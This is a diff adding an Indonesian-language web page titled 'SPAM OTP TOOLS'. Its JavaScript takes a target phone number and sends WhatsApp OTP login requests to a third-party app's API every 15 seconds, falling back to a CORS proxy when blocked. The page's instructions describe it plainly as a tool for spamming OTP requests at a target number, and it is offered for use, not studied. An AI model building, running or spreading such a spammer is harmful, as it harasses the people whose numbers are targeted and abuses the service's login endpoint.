@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPAM OTP TOOLS | DZBXV.AXM Project Tool</title>
+    <link rel="icon" type="image/png" href="img/file_0000000091c0720898185730fc76ba19.png">
+    <style>
+        /* === HACKER LOGO GLITCH EFFECT === */
+.hacker-logo {
+    position: relative;
+    overflow: visible;
+}
+
+/* Efek neon merah biru */
+.mask-main {
+    animation: glitchMove 1.4s infinite ease-in-out,
+               glitchFloat 2.5s infinite ease-in-out;
+    filter:
+        drop-shadow(-4px 0 6px red)
+        drop-shadow(4px 0 6px cyan);
+}
+
+/* naik turun keluar bingkai */
+@keyframes glitchFloat {
+    0%   { transform: translateY(0); }
+    50%  { transform: translateY(-6px) scale(1.05); }
+    100% { transform: translateY(0); }
+}
+
+/* glitch kiri kanan */
+@keyframes glitchMove {
+    0% { transform: translateX(0); }
+    20% { transform: translateX(-3px); }
+    40% { transform: translateX(3px); }
+    60% { transform: translateX(-2px); }
+    80% { transform: translateX(2px); }
+    100% { transform: translateX(0); }
+}
+        :root {
+            --primary-bg: #0a0a0a;
+            --secondary-bg: #111111;
+            --card-bg: rgba(20, 20, 20, 0.9);
+            --accent-color: #ffffff;
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --success-color: #ffffff;
+            --error-color: #ffffff;
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* TV ERROR BACKGROUND EFFECTS */
+        .tv-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        /* Static Noise */
+        .static-noise {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(
+                    0deg,
+                    rgba(0, 0, 0, 0.15) 0px,
+                    rgba(0, 0, 0, 0.15) 1px,
+                    transparent 1px,
+                    transparent 2px
+                ),
+                repeating-linear-gradient(
+                    90deg,
+                    rgba(0, 0, 0, 0.1) 0px,
+                    rgba(0, 0, 0, 0.1) 1px,
+                    transparent 1px,
+                    transparent 2px
+                );
+            opacity: 0.3;
+            animation: staticMove 0.1s infinite;
+        }
+
+        /* Scan Lines */
+        .scan-lines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 0, 0, 0.1) 50%
+            );
+            background-size: 100% 4px;
+            animation: scanMove 0.2s linear infinite;
+        }
+
+        /* Glitch Effect */
+        .glitch-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(90deg, #ff0000 0%, #00ff00 50%, #0000ff 100%);
+            mix-blend-mode: overlay;
+            opacity: 0.05;
+            animation: glitch 2s infinite;
+        }
+
+        /* Color Bars Distortion */
+        .color-bars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                #ff0000 0%,
+                #ff0000 16.666%,
+                #ffff00 16.666%,
+                #ffff00 33.333%,
+                #00ff00 33.333%,
+                #00ff00 50%,
+                #00ffff 50%,
+                #00ffff 66.666%,
+                #0000ff 66.666%,
+                #0000ff 83.333%,
+                #ff00ff 83.333%,
+                #ff00ff 100%
+            );
+            opacity: 0;
+            animation: colorFlash 5s infinite;
+            mix-blend-mode: overlay;
+        }
+
+        /* Screen Flicker */
+        .screen-flicker {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            opacity: 0;
+            animation: screenFlicker 8s infinite;
+        }
+
+        /* Horizontal Lines Distortion */
+        .horizontal-lines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 3px,
+                rgba(255, 255, 255, 0.02) 3px,
+                rgba(255, 255, 255, 0.02) 4px
+            );
+            animation: horizontalDistort 3s infinite;
+        }
+
+        /* Vertical Jitter */
+        .vertical-jitter {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            animation: verticalJitter 0.5s infinite;
+        }
+
+        /* Signal Loss */
+        .signal-loss {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(
+                circle at 50% 50%,
+                transparent 30%,
+                rgba(0, 0, 0, 0.8) 70%
+            );
+            opacity: 0;
+            animation: signalLoss 12s infinite;
+        }
+
+        /* Brutal Distortion */
+        .brutal-distortion {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                conic-gradient(
+                    from 0deg at 50% 50%,
+                    #ff0000,
+                    #00ff00,
+                    #0000ff,
+                    #ff0000
+                );
+            mix-blend-mode: difference;
+            opacity: 0;
+            animation: brutalDistort 7s infinite;
+            filter: blur(10px);
+        }
+
+        /* ANIMATIONS */
+        @keyframes staticMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(10px, 10px); }
+        }
+
+        @keyframes scanMove {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        @keyframes glitch {
+            0% { transform: translateX(0); opacity: 0.05; }
+            25% { transform: translateX(-5px); opacity: 0.1; }
+            50% { transform: translateX(5px); opacity: 0.05; }
+            75% { transform: translateX(-3px); opacity: 0.08; }
+            100% { transform: translateX(0); opacity: 0.05; }
+        }
+
+        @keyframes colorFlash {
+            0%, 85% { opacity: 0; }
+            86% { opacity: 0.3; }
+            87% { opacity: 0; }
+            88% { opacity: 0.4; }
+            89% { opacity: 0; }
+            90% { opacity: 0.2; }
+            91% { opacity: 0; }
+            92% { opacity: 0.5; }
+            93% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        @keyframes screenFlicker {
+            0%, 92%, 94%, 96%, 98%, 100% { opacity: 0; }
+            93%, 95%, 97%, 99% { opacity: 0.1; }
+        }
+
+        @keyframes horizontalDistort {
+            0%, 90% { transform: scaleY(1); }
+            91% { transform: scaleY(0.8); }
+            92% { transform: scaleY(1.2); }
+            93% { transform: scaleY(0.9); }
+            94% { transform: scaleY(1.1); }
+            95% { transform: scaleY(1); }
+        }
+
+        @keyframes verticalJitter {
+            0%, 80% { transform: translateX(0); }
+            81% { transform: translateX(-2px); }
+            82% { transform: translateX(2px); }
+            83% { transform: translateX(-1px); }
+            84% { transform: translateX(1px); }
+            85% { transform: translateX(0); }
+        }
+
+        @keyframes signalLoss {
+            0%, 88% { opacity: 0; }
+            89% { opacity: 0.6; }
+            90% { opacity: 0; }
+            91% { opacity: 0.8; }
+            92% { opacity: 0; }
+            93% { opacity: 0.4; }
+            94% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        @keyframes brutalDistort {
+            0%, 93% { opacity: 0; transform: scale(1) rotate(0deg); }
+            94% { opacity: 0.3; transform: scale(1.1) rotate(5deg); }
+            95% { opacity: 0.2; transform: scale(0.9) rotate(-5deg); }
+            96% { opacity: 0.4; transform: scale(1.2) rotate(10deg); }
+            97% { opacity: 0.1; transform: scale(0.8) rotate(-10deg); }
+            98% { opacity: 0.5; transform: scale(1.3) rotate(15deg); }
+            99% { opacity: 0; transform: scale(1) rotate(0deg); }
+            100% { opacity: 0; }
+        }
+
+        /* MAIN LAYOUT STYLES */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 40px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            border-radius: 12px;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            color: var(--primary-bg);
+        }
+
+        .brand-text h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            text-shadow: 0 0 10px red;
+        }
+
+        .brand-text p {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .music-control {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--card-bg);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+
+        .music-btn {
+            width: 45px;
+            height: 45px;
+            border: none;
+            border-radius: 50%;
+            background: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.25s ease;
+        }
+
+        .music-btn:hover {
+            background: #343434;
+            transform: scale(1.06);
+        }
+
+        .music-status {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        #musicText {
+            font-size: 15px;
+            font-weight: 500;
+            color: #e5e5e5;
+            font-family: "Poppins", sans-serif;
+        }
+
+        #musicState {
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 2px;
+            font-family: "Poppins", sans-serif;
+        }
+
+        #musicState.on {
+            color: #17ff45;
+            text-shadow: 0 0 6px #17ff45;
+        }
+
+        #musicState.off {
+            color: #ff2b2b;
+            text-shadow: 0 0 6px #ff2b2b;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .phone-input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
+        }
+
+        .phone-input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            transition: var(--transition);
+        }
+
+        .stat-card:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-3px);
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            background: linear-gradient(135deg, var(--accent-color) 0%, #b0b0b0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .control-panel {
+            display: flex;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .btn {
+            padding: 16px 28px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: var(--transition);
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: rgba(255, 255, 255, 0.9);
+            color: #000;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #fff;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 12px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #666;
+            transition: var(--transition);
+        }
+
+        .status-dot.active {
+            background: var(--success-color);
+            box-shadow: 0 0 10px var(--success-color);
+        }
+
+        .status-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .log-container {
+            margin-top: 30px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .log-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-sm {
+            padding: 8px 16px;
+            font-size: 13px;
+            border-radius: 8px;
+        }
+
+        #log {
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--text-primary);
+            padding: 20px;
+            border-radius: 12px;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.5;
+            border: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        }
+
+        .log-entry {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .log-time {
+            color: var(--text-secondary);
+            font-size: 12px;
+            min-width: 80px;
+        }
+
+        .log-message {
+            flex: 1;
+        }
+
+        .log-success { color: var(--success-color); }
+        .log-error { color: var(--error-color); opacity: 0.7; }
+        .log-info { color: var(--text-primary); }
+        .log-warning { color: var(--text-primary); font-weight: 500; }
+
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 50px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .social-link {
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .social-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        @media (max-width: 1024px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            
+            .container {
+                padding: 15px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .control-panel {
+                flex-direction: column;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .card:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+    </style>
+</head>
+<body>
+    <!-- TV ERROR BACKGROUND EFFECTS -->
+    <div class="tv-overlay">
+        <div class="static-noise"></div>
+        <div class="scan-lines"></div>
+        <div class="glitch-overlay"></div>
+        <div class="color-bars"></div>
+        <div class="screen-flicker"></div>
+        <div class="horizontal-lines"></div>
+        <div class="vertical-jitter"></div>
+        <div class="signal-loss"></div>
+        <div class="brutal-distortion"></div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="main-header">
+            <div class="brand">
+                <!-- Logo Seram Baru (Tengkorak SVG) -->
+                <div class="logo hacker-logo">
+<svg viewBox="0 0 200 200" width="120" height="120">
+
+<style>
+@keyframes glitch {
+  0% { transform: translate(0); }
+  20% { transform: translate(-2px,2px); }
+  40% { transform: translate(-2px,-2px); }
+  60% { transform: translate(2px,2px); }
+  80% { transform: translate(2px,-2px); }
+  100% { transform: translate(0); }
+}
+
+@keyframes glowEye {
+  0%,100% { opacity:1; }
+  50% { opacity:0.4; }
+}
+
+.glitch {
+  animation: glitch 0.4s infinite;
+}
+
+.eye {
+  animation: glowEye 1s infinite;
+}
+</style>
+
+<!-- Lingkaran -->
+<circle cx="100" cy="100" r="85"
+        fill="#050505"
+        stroke="#ff0000"
+        stroke-width="3"
+        class="glitch"/>
+
+<!-- TANDUK RUSA -->
+<g fill="#770000">
+  <!-- kiri -->
+  <path d="M70 60 Q40 20 55 50 Q30 35 50 70 Q35 60 60 85 Z"/>
+  <!-- kanan -->
+  <path d="M130 60 Q160 20 145 50 Q170 35 150 70 Q165 60 140 85 Z"/>
+</g>
+
+<!-- Kepala -->
+<g class="glitch">
+  <circle cx="100" cy="95" r="45" fill="#cc0000"/>
+
+  <!-- Mata -->
+  <ellipse cx="85" cy="95" rx="8" ry="5"
+           fill="#ff0000"
+           class="eye"/>
+  <ellipse cx="115" cy="95" rx="8" ry="5"
+           fill="#ff0000"
+           class="eye"/>
+
+  <!-- Senyum -->
+  <path d="M80 120 Q100 140 120 120"
+        stroke="#330000"
+        stroke-width="3"
+        fill="none"/>
+</g>
+
+<!-- TANGAN KIRI NORMAL -->
+<g fill="#cc0000">
+  <path d="M40 140 Q60 110 80 125 Q75 160 50 170 Z"/>
+  <line x1="55" y1="150" x2="50" y2="175"
+        stroke="#550000" stroke-width="3"/>
+</g>
+
+<!-- TANGAN KANAN HANCUR -->
+<g class="glitch">
+  <polygon points="150,130 170,110 185,140 165,165"
+           fill="#aa0000"/>
+  <polygon points="160,140 180,125 190,150 170,175"
+           fill="#550000"/>
+</g>
+
+</svg>
+
+                </div>
+
+                <div class="brand-text">
+                    <h1>WhatsApp Tools</h1>
+                    <p>Creator: DZBXV.AXM</p>
+                </div>
+            </div>
+            
+            <!-- MUSIC CONTROL PROFESSIONAL -->
+            <div class="music-control">
+                <button class="music-btn" onclick="toggleMusic()" id="musicBtn">
+                    <!-- Icon Professional (Play / Pause) -->
+                    <svg id="musicIcon" width="22" height="22" viewBox="0 0 24 24" fill="none">
+                        <path id="iconPath" d="M8 5v14l11-7z" fill="#ffffff"/>
+                    </svg>
+                </button>
+
+                <div class="music-status">
+                    <span id="musicText">Music</span>
+                    <span id="musicState" class="off"></span>
+                </div>
+
+                <audio id="bgMusic" loop>
+                    <source src="https://g.top4top.io/m_3711fx8vz0.mp3" type="audio/mpeg">
+                </audio>
+            </div>
+        </header>
+
+        <!-- Main Dashboard -->
+        <div class="dashboard">
+            <!-- Control Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-icon">
+                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="8" r="4" stroke="#ffffff" stroke-width="2"/>
+                            <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <h2 class="card-title">Control Panel</h2>
+                </div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot" id="statusDot"></div>
+                    <span class="status-text" id="statusText">System Ready</span>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Target Phone Number</label>
+                    <input type="text" class="phone-input" id="phoneNumber" 
+                           placeholder="Enter phone number (62XXXX or 08XXXX)" value="">
+                </div>
+                
+                <div class="control-panel">
+                    <button class="btn btn-primary" id="startBtn" onclick="startSpam()">
+                        <span></span> Gas Spam
+                    </button>
+                    <button class="btn btn-secondary" id="stopBtn" onclick="stopSpam()" disabled>
+                        <span></span> Stop Spam
+                    </button>
+                </div>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="totalAttempts">0</div>
+                        <div class="stat-label">Total Attempts</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="successAttempts">0</div>
+                        <div class="stat-label">Success Attempts</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Information Card -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">System Information</h2>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+    <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--text-secondary);">Cara Kerja</h3>
+    <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.6;">
+        Tool ini mengirim spam permintaan OTP ke nomor telepon target setiap 15 detik. 
+        Meskipun CORS diblokir, permintaan tetap dicoba dan mungkin berhasil di sisi server.
+    </p>
+</div>
+
+<div style="margin-bottom: 20px;">
+    <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--text-secondary);">Petunjuk Penggunaan</h3>
+    <ul style="font-size: 14px; color: var(--text-secondary); line-height: 1.6; padding-left: 20px;">
+        <li>Masukkan nomor telepon yang valid (format 08XX atau 62XX)</li>
+        <li>Klik "Gas Spam" untuk mulai mengirim permintaan</li>
+        <li>Pantau log aktivitas untuk melihat hasil</li>
+        <li>Gunakan "Stop Spam" untuk menghentikan proses</li>
+        <li>Gunakan dengan bijak dan bertanggung jawab</li>
+    </ul>
+</div>
+
+<div class="social-links">
+    <a href="https://whatsapp.com/channel/0029VbBgprn5EjxwGQ1NP618" class="social-link" target="_blank">
+        <span>✓</span> Saluran WA
+    </a>
+</div>
+        
+        <!-- Log Container -->
+        <div class="card log-container">
+            <div class="log-header">
+                <div class="card-header">
+                    <h2 class="card-title">Activity Log</h2>
+                </div>
+                <div class="log-actions">
+                    <button class="btn btn-secondary btn-sm" onclick="clearLog()">
+                        Clear Log
+                    </button>
+                </div>
+            </div>
+            <div id="log"></div>
+        </div>
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <p>SPAM OTP Tool &copy; 2026 | GUNAKAN DENGAN BIJAK YA WOK!</p>
+        </footer>
+    </div>
+
+    <script>
+        // === MUSIC SYSTEM ===
+        function toggleMusic() {
+            const music = document.getElementById("bgMusic");
+            const iconPath = document.getElementById("iconPath");
+            const stateText = document.getElementById("musicState");
+
+            if (music.paused) {
+                music.play();
+
+                // Change icon → Pause
+                iconPath.setAttribute("d", "M6 4h4v16H6zm8 0h4v16h-4z");
+
+                // Update status text
+                stateText.innerText = "ON";
+                stateText.classList.remove("off");
+                stateText.classList.add("on");
+
+            } else {
+                music.pause();
+
+                // Change icon → Play
+                iconPath.setAttribute("d", "M8 5v14l11-7z");
+
+                // Update status text
+                stateText.innerText = "OFF";
+                stateText.classList.remove("on");
+                stateText.classList.add("off");
+            }
+        }
+
+        // === SPAMMER SYSTEM ===
+        let isSpamming = false;
+        let spamInterval = null;
+        let totalAttempts = 0;
+        let successAttempts = 0;
+
+        // Update status indicator
+        function updateStatusIndicator() {
+            const dot = document.getElementById('statusDot');
+            const text = document.getElementById('statusText');
+            
+            if (isSpamming) {
+                dot.classList.add('active');
+                text.textContent = 'Spamming Active';
+            } else {
+                dot.classList.remove('active');
+                text.textContent = 'System Ready';
+            }
+        }
+
+        // Direct API Call to Singa
+        async function sendSingaOTP(phoneNumber) {
+            const url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
+            
+            const payload = {
+                mobile_phone: phoneNumber,
+                type: 'mobile',
+                is_switchable: 1
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json; charset=utf-8',
+                        'Accept': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        success: true,
+                        message: 'OTP Singa berhasil dikirim!',
+                        data: data
+                    };
+                } else {
+                    return {
+                        success: false,
+                        error: `HTTP Error: ${response.status}`
+                    };
+                }
+            } catch (error) {
+                return await tryWithProxy(phoneNumber);
+            }
+        }
+
+        // CORS Proxy Fallback
+        async function tryWithProxy(phoneNumber) {
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+            const targetUrl = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
+            
+            const payload = {
+                mobile_phone: phoneNumber,
+                type: 'mobile',
+                is_switchable: 1
+            };
+
+            try {
+                const response = await fetch(proxyUrl + targetUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json; charset=utf-8',
+                        'Accept': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        success: true,
+                        message: 'OTP Singa berhasil dikirim via proxy!',
+                        data: data
+                    };
+                } else {
+                    return {
+                        success: false,
+                        error: `Proxy Error: ${response.status}`
+                    };
+                }
+            } catch (proxyError) {
+                return {
+                    success: false,
+                    error: 'CORS blocked - Tapi request mungkin sudah terkirim'
+                };
+            }
+        }
+
+        function addLog(message, type = 'info') {
+            const log = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            const logClass = `log-${type}`;
+            
+            if (log.children.length > 100) {
+                log.removeChild(log.firstChild);
+            }
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${logClass}`;
+            logEntry.innerHTML = `
+                <div class="log-time">${timestamp}</div>
+                <div class="log-message">${message}</div>
+            `;
+            
+            log.appendChild(logEntry);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+            addLog('Log cleared', 'info');
+        }
+
+        function updateStats() {
+            document.getElementById('totalAttempts').textContent = totalAttempts;
+            document.getElementById('successAttempts').textContent = successAttempts;
+        }
+
+        async function spamCycle(phoneNumber) {
+            if (!isSpamming) return;
+
+            totalAttempts++;
+            updateStats();
+
+            addLog(`Mengirim OTP Singa ke ${phoneNumber}...`, 'info');
+            
+            const result = await sendSingaOTP(phoneNumber);
+
+            if (result.success) {
+                successAttempts++;
+                updateStats();
+                addLog(`${result.message}`, 'success');
+            } else {
+                addLog(`${result.error}`, 'error');
+                addLog(`Tapi request mungkin sudah terkirim di server side`, 'warning');
+            }
+        }
+
+        function startSpam() {
+            const phoneInput = document.getElementById('phoneNumber').value.trim();
+            if (!phoneInput) {
+                addLog('MASUKKAN NOMOR TARGET DAHULU!', 'error');
+                return;
+            }
+
+            const phone = normalizePhone(phoneInput);
+            if (!/^(62|08)\d+$/.test(phone)) {
+                addLog('FORMAT NOMOR SALAH! Gunakan 08XX atau 62XX', 'error');
+                return;
+            }
+
+            isSpamming = true;
+            updateStatusIndicator();
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+
+            addLog(`MEMULAI SPAM SINGA KE: ${phone}`, 'success');
+            addLog(`TARGET: ${phone}`, 'info');
+            addLog(`Setiap 15 detik akan kirim ulang...`, 'info');
+
+            if (spamInterval) clearInterval(spamInterval);
+
+            spamInterval = setInterval(() => {
+                if (isSpamming) {
+                    spamCycle(phone);
+                }
+            }, 15000);
+
+            // Immediate first attempt
+            spamCycle(phone);
+        }
+
+        function stopSpam() {
+            isSpamming = false;
+            updateStatusIndicator();
+            if (spamInterval) {
+                clearInterval(spamInterval);
+                spamInterval = null;
+            }
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            
+            addLog('SPAM DIHENTIKAN', 'info');
+        }
+
+        function normalizePhone(phone) {
+            phone = phone.replace(/\D/g, '');
+            if (phone.startsWith('0')) phone = '62' + phone.substring(1);
+            if (phone.startsWith('8')) phone = '62' + phone;
+            return phone;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStatusIndicator();
+            addLog('SYSTEM READY', 'success');
+            addLog('Masukkan nomor dan tekan GAS SPAM', 'info');
+            addLog('Music siap dimainkan', 'info');
+
+            document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') startSpam();
+            });
+
